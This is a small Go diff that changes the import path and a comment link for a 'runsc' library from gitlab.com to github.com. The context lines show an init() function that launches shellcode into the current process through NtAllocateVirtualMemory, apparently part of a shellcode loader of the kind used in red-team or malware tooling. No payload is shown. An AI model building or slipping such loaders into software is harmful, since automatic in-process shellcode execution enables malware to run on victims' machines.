@@ -8,7 +8,7 @@ import (
 	"compress/gzip"
 	"io"
 
-	"gitlab.com/mjwhitta/runsc"
+	"github.com/mjwhitta/runsc"
 )
 
 func init() {
@@ -31,7 +31,7 @@ func init() {
 	}
 
 	// Launch shellcode into current process using
-	// NtAllocateVirtualMemory. See gitlab.com/mjwhitta/runsc for
+	// NtAllocateVirtualMemory. See github.com/mjwhitta/runsc for
 	// other methods.
 	if e = runsc.WithNtAllocateVirtualMemory(0, sc); e != nil {
 		return
